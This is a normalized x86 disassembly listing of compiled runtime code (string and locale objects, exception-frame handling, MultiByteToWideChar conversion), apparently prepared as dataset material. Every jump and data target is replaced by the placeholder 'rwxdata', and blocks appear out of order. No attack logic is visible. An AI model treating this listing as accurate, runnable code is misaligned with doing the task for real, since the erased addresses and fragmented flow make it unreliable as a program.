mov eax [ esi + 0x44 ]
cmp [ eax + 0x8 ] 0x2
jb rwxdata
mov esi eax
mov ecx esi
call sub_4292c0
push 0x2
lea eax [ ebp - 0x2 ]
push [ esi + 0x4 ]
push eax
call sub_422780
add esp 0xc
sub_42a071
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
push esi
mov [ ebp - 0x8 ] eax
sub eax eax
add eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push edi
mov edi eax
mov eax [ esi + 0x50 ]
test eax eax
mov [ ebp - 0x4 ] ecx
je rwxdata
mov eax [ rwxdata ]
or [ ebp + 0xc ] 0xffffffff
mov [ ebp + 0x14 ] eax
mov eax [ rwxdata ]
mov [ ebp + 0x18 ] eax
mov eax [ rwxdata ]
push 0x6
mov [ ebp + 0x1c ] eax
pop ecx
lea esi [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call sub_42b4cf
pop ecx
test eax eax
pop ecx
jne rwxdata
test edi edi
je rwxdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x50 ]
call sub_42b421
pop ecx
test eax eax
pop ecx
jne rwxdata
push 0x1
push edi
push [ esi + 0x50 ]
call sub_42b443
add esp 0xc
test eax eax
jne rwxdata
mov ecx [ esi + 0x44 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x8 ]
and [ ebp + 0xc ] 0x0
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x18 ] eax
mov eax [ esi + 0x40 ]
push 0x6
mov [ ebp + 0x1c ] eax
pop ecx
lea esi [ ebp + 0xc ]
jmp rwxdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x40 ] eax
push [ rwxdata ]
push 0x0
call sub_42910e
mov eax [ ebp + 0x8 ]
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x20
sub_42a133
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
xor eax eax
mov ecx [ esp + 0xc ]
add ecx ecx
push ecx
push 0x0
push [ esp + 0x10 ]
push eax
call sub_42b4e7
add esp 0x10
test eax eax
jne rwxdata
mov eax esi
jmp rwxdata
pop esi
retn 0x8
sub_42a20c
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push 0x20
and [ esi + 0x2c ] 0x0
mov [ esi + 0x28 ] eax
call sub_42aeed
pop ecx
mov [ esi + 0x30 ] ax
mov ecx esi
call sub_42a69f
cmp [ esi + 0x28 ] 0x0
jne rwxdata
cmp [ esp + 0xc ] 0x0
je rwxdata
mov eax [ esi + 0x4 ]
push 0x0
or al 0x4
mov ecx esi
or al 0x4
push eax
call sub_42a36e
pop esi
retn 0x8
mov ecx esi
call sub_42a66a
sub_42a2af
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
xor eax eax
pop esi
retn
push eax
call sub_422ab5
test eax eax
pop ecx
jne rwxdata
push 0x2
push eax
mov ecx esi
call sub_42a2d6
mov eax esi
pop esi
retn
sub_42a2d6
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
sete al
cmp [ esp + 0xc ] 0x0
mov [ esi + 0x48 ] al
jne rwxdata
mov ecx esi
call sub_4293d6
mov eax [ esp + 0x8 ]
mov [ esi + 0x50 ] eax
mov eax [ rwxdata ]
mov [ esi + 0x40 ] eax
mov eax [ rwxdata ]
and [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] eax
pop esi
retn 0x8
push edi
lea edi [ esi + 0x4c ]
mov ecx edi
call sub_428a89
test edi edi
je rwxdata
and [ esi + 0x44 ] 0x0
pop edi
mov ecx edi
call sub_428a6a
sub_42a36e
mov eax sub_42d05c
call sub_42b24c
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
and eax 0x7
mov [ ecx + 0x4 ] eax
mov ecx [ ecx + 0x8 ]
and ecx eax
je rwxdata
mov ecx [ ebp - 0xc ]
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je rwxdata
test cl 0x4
push esi
je rwxdata
push ebx
push ebx
call sub_42b927
test cl 0x2
mov esi rwxdata
jne rwxdata
mov esi rwxdata
jmp rwxdata
mov al [ ebp + 0xf ]
push ebx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] al
call sub_429175
push esi
call sub_4224c0
pop ecx
push eax
push esi
lea ecx [ ebp - 0x1c ]
call sub_4293a1
lea eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_42a40a
lea eax [ ebp - 0x38 ]
push rwxdata
push eax
mov [ ebp - 0x38 ] rwxdata
call sub_42b927
pop esi
mov esi rwxdata
sub_42a40a
mov eax sub_42d070
call sub_42b24c
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rwxdata
call sub_42b87d
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_429175
push [ rwxdata ]
mov ecx edi
push 0x0
push ebx
call sub_42a721
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42a498
mov eax sub_42d084
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_429175
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42b904
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42a4f1
mov eax sub_42d098
call sub_42b24c
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_42b8ba
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_429175
push [ rwxdata ]
mov ecx edi
push 0x0
push ebx
call sub_42a721
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42a54e
mov eax sub_42d0ac
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_429175
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42b904
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42a58b
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_42a5c4
lea eax [ ebp - 0x1c ]
push rwxdata
push eax
call sub_42b927
push esi
mov esi ecx
call sub_42a54e
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a5dc
mov eax sub_42d0c3
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
mov eax [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
test eax eax
jbe rwxdata
mov ecx esi
call sub_42a6d7
dec [ eax + rwxdata ]
mov eax [ esi + 0x24 ]
cmp [ eax + rwxdata ] 0x0
jg rwxdata
lea ecx [ esi + 0x20 ]
call sub_428a89
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42a648
push esi
push edi
mov edi ecx
mov esi [ edi + 0x1c ]
pop edi
pop esi
retn 0x4
push [ esi + 0x4 ]
push edi
push [ esp + 0x14 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
jmp rwxdata
test esi esi
je rwxdata
sub_42a66a
cmp [ ecx + 0x24 ] 0x8
jae rwxdata
mov eax [ ecx + 0x24 ]
mov [ eax * 4 + rwxdata ] ecx
mov ecx [ ecx + 0x24 ]
inc [ ecx + rwxdata ]
retn
mov eax [ ecx + 0x24 ]
mov edx [ eax * 4 + rwxdata ]
test edx edx
je rwxdata
cmp edx ecx
je rwxdata
inc eax
cmp eax 0x8
mov [ ecx + 0x24 ] eax
jb rwxdata
sub_42a69f
push esi
mov esi ecx
push edi
xor edi edi
lea ecx [ esi + 0x20 ]
cmp ecx edi
je rwxdata
push edi
push edi
mov ecx esi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] 0x201
mov [ esi + 0x10 ] 0x6
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call sub_42a36e
pop edi
pop esi
retn
call sub_428a6a
sub_42a6d7
push esi
push edi
mov esi ecx
push 0x0
call sub_42a648
mov eax [ esi + 0x18 ]
test eax eax
je rwxdata
mov eax [ esi + 0x1c ]
and [ esi + 0x18 ] 0x0
test eax eax
je rwxdata
mov edi [ eax ]
push eax
call sub_42aa87
test edi edi
pop ecx
mov eax edi
jne rwxdata
and [ esi + 0x1c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_42aa87
test edi edi
pop ecx
mov eax edi
jne rwxdata
sub_42a721
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
cmp [ ebx + 0x8 ] eax
jae rwxdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov esi eax
sub esi ecx
cmp [ ebp + 0x10 ] esi
jae rwxdata
call sub_42acb1
cmp edi ebx
jne rwxdata
mov esi [ ebp + 0x10 ]
test esi esi
jbe rwxdata
push [ rwxdata ]
add esi ecx
mov ecx edi
push esi
call sub_42910e
push [ ebp + 0xc ]
mov ecx edi
push 0x0
call sub_42910e
jmp rwxdata
push 0x1
push esi
mov ecx edi
call sub_4292ec
test al al
je rwxdata
cmp esi eax
jne rwxdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x4 ]
test eax eax
jne rwxdata
mov eax [ ebx + 0x4 ]
test eax eax
jne rwxdata
mov ecx [ ebp + 0xc ]
push esi
add eax ecx
push eax
push [ edi + 0x4 ]
call sub_422780
mov eax [ edi + 0x4 ]
add esp 0xc
mov [ edi + 0x8 ] esi
and [ eax + esi ] 0x0
mov eax rwxdata
cmp [ eax - 0x1 ] 0xfe
jae rwxdata
mov eax rwxdata
push 0x1
mov ecx edi
call sub_429175
mov eax [ ebx + 0x4 ]
test eax eax
jne rwxdata
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x8 ] ecx
mov ecx [ ebx + 0xc ]
mov [ edi + 0xc ] ecx
inc [ eax - 0x1 ]
jmp rwxdata
mov eax rwxdata
sub_42a810
mov eax sub_42d0e2
call sub_42b24c
push ecx
mov eax [ rwxdata ]
and [ ebp - 0x4 ] 0x0
test eax eax
jne rwxdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push 0x28
call sub_42b588
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je rwxdata
xor eax eax
push 0x0
call sub_42a912
jmp rwxdata
mov ecx rwxdata
test ecx ecx
je rwxdata
inc ecx
mov [ eax + 0x4 ] ecx
mov eax [ rwxdata ]
and [ ebp - 0x4 ] 0x0
push esi
push edi
push sub_42a8ca
mov [ rwxdata ] eax
call sub_42247a
mov eax [ rwxdata ]
mov esi rwxdata
push esi
mov [ eax + 0x10 ] 0x3f
mov eax [ rwxdata ]
lea edi [ eax + 0x18 ]
call sub_4224c0
pop ecx
pop ecx
push eax
push esi
mov ecx edi
call sub_4293a1
mov eax [ rwxdata ]
pop edi
mov [ rwxdata ] eax
pop esi
mov ecx [ eax + 0x4 ]
cmp ecx 0xffffffff
jae rwxdata
mov ecx [ rwxdata ]
mov [ rwxdata ] ecx
sub_42a8ca
mov eax sub_42d0f4
call sub_42b24c
mov eax [ rwxdata ]
and [ esp + 0x8 ] 0x0
test eax eax
je rwxdata
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe rwxdata
mov ecx [ eax + 0x4 ]
neg ecx
sbb ecx ecx
not ecx
and ecx eax
je rwxdata
cmp ecx 0xffffffff
jae rwxdata
mov eax [ ecx ]
push 0x1
call [ eax ]
dec ecx
mov [ eax + 0x4 ] ecx
sub_42a912
mov eax sub_42d108
call sub_42b24c
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov [ esi ] rwxdata
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
mov cl [ ebp + 0xb ]
lea edi [ esi + 0x18 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ edi ] cl
push eax
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_429175
mov ebx rwxdata
push ebx
call sub_4224c0
pop ecx
push eax
push ebx
mov ecx edi
call sub_4293a1
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42a9c4
mov eax sub_42d12f
call sub_42b24c
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x2
push [ esi + 0x8 ]
call sub_423e39
and [ ebp - 0x4 ] 0x0
pop ecx
push 0x1
lea ecx [ esi + 0x18 ]
call sub_429175
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x8 ]
dec edi
mov eax [ eax + edi * 4 ]
test eax eax
je rwxdata
test edi edi
jbe rwxdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe rwxdata
mov ecx [ eax + 0x4 ]
neg ecx
sbb ecx ecx
not ecx
and ecx eax
je rwxdata
cmp ecx 0xffffffff
jae rwxdata
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp rwxdata
dec ecx
mov [ eax + 0x4 ] ecx
sub_42aa92
mov eax sub_42d144
call sub_42b24c
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_429175
mov esi rwxdata
push esi
call sub_4224c0
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4293a1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_42aaec
lea eax [ ebp - 0x3c ]
push rwxdata
push eax
mov [ ebp - 0x3c ] rwxdata
call sub_42b927
pop esi
mov eax sub_42d158
call sub_42b24c
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rwxdata
call sub_42b87d
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_429175
push [ rwxdata ]
mov ecx edi
push 0x0
push ebx
call sub_42a721
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42aaec
mov eax sub_42d158
call sub_42b24c
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rwxdata
call sub_42b87d
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_429175
push [ rwxdata ]
mov ecx edi
push 0x0
push ebx
call sub_42a721
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42ab6d
mov eax sub_42d16c
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_429175
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42b904
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42abc6
mov eax sub_42d180
call sub_42b24c
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_42b8ba
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_429175
push [ rwxdata ]
mov ecx edi
push 0x0
push ebx
call sub_42a721
mov ecx [ ebp - 0xc ]
mov [ esi ] rwxdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_42ac23
mov eax sub_42d194
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_429175
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42b904
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42ac60
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_42ac99
lea eax [ ebp - 0x1c ]
push rwxdata
push eax
call sub_42b927
push esi
mov esi ecx
call sub_42ac23
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42acb1
mov eax sub_42d1a8
call sub_42b24c
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_429175
mov esi rwxdata
push esi
call sub_4224c0
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4293a1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_42aaec
lea eax [ ebp - 0x3c ]
push rwxdata
push eax
mov [ ebp - 0x3c ] rwxdata
call sub_42b927
pop esi
sub_42ad0b
mov eax sub_42d1bc
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_429175
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42b904
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42ad48
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_42ad81
lea eax [ ebp - 0x1c ]
push rwxdata
push eax
call sub_42b927
push esi
mov esi ecx
call sub_42ad0b
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42addb
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp edi ebx
je rwxdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je rwxdata
mov dl [ edi ]
cmp dl bl
jne rwxdata
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je rwxdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
jmp rwxdata
mov [ eax ] bx
mov esi [ ebp + 0x14 ]
cmp [ esi ] ebx
je rwxdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je rwxdata
cmp ecx ebx
jne rwxdata
mov ebx [ rwxdata ]
movzx ecx dl
test [ ebx + ecx * 2 + 0x1 ] 0x80
je rwxdata
mov [ esi + 0x1 ] dl
cmp [ rwxdata ] 0x1
jle rwxdata
push 0x1
movzx cx dl
mov [ eax ] cx
xor ecx ecx
cmp [ ebp + 0x8 ] ecx
setne cl
push ecx
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne rwxdata
mov ecx [ rwxdata ]
cmp [ ebp + 0x10 ] ecx
jae rwxdata
mov [ esi ] ebx
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
pop ebp
retn
jmp rwxdata
cmp ecx 0x1
jle rwxdata
mov [ esi ] dl
push 0xfffffffe
jmp rwxdata
mov [ esi ] ebx
mov [ rwxdata ] 0x2a
or eax 0xffffffff
jmp rwxdata
cmp [ edi + 0x1 ] 0x0
jne rwxdata
xor edx edx
cmp [ ebp + 0x8 ] edx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push edi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne rwxdata
pop eax
jmp rwxdata
mov eax [ rwxdata ]
jmp rwxdata
and [ esi ] 0x0
jmp rwxdata
sub_42aeed
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne rwxdata
mov [ ebp + 0xb ] al
lea eax [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0x0
push 0x0
push eax
lea eax [ ebp + 0xb ]
push 0x1
push eax
lea eax [ ebp - 0x2 ]
push eax
call sub_42addb
add esp 0x14
test eax eax
mov eax 0xffff
jl rwxdata
or ax 0xffff
leave
retn
leave
retn
movzx eax [ ebp - 0x2 ]
sub_42af65
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_42afa7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] rwxdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_42aff6
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42baa4
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_42b02c
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_42b080
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_42c2a0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_42b080
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_42baa4
add esp 0x20
pop ebp
retn
sub_42b0a5
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_42b159
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] rwxdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rwxdata ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je rwxdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp rwxdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_42b159
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je rwxdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_42baa4
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne rwxdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp rwxdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42afa7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42b1ce
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl rwxdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja rwxdata
cmp esi 0xffffffff
jne rwxdata
call sub_42c342
cmp esi eax
jbe rwxdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge rwxdata
call sub_42c342
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne rwxdata
cmp ecx [ eax + 0x8 ]
jle rwxdata
cmp [ ebp + 0xc ] 0x0
jge rwxdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_42b26b
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne rwxdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je rwxdata
xor eax eax
jmp rwxdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp rwxdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb rwxdata
mov eax [ esi + 0x4 ]
test eax eax
je rwxdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je rwxdata
